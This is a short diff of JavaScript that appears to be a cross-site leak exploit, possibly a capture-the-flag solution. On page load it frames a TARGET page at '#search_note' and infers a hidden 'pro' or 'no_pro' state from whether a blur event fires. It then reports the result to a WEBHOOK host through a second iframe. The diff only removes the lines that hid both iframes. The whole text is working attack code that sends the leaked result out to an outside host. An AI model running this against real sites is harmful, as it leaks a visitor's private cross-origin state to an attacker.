@@ -7,13 +7,11 @@ window.onload = function () {
     window.addEventListener("blur", () => { blurFired = true; });
     const iframe = document.createElement("iframe");
     iframe.src = TARGET + "#search_note";
-    iframe.style.display = "none";
     document.body.appendChild(iframe);
     setTimeout(() => {
         const result = blurFired ? "pro" : "no_pro";
         const ex = document.createElement("iframe");
         ex.src = WEBHOOK + "?result=" + result;
-        ex.style.display = "none";
         document.body.appendChild(ex);
     }, 1000);
 };
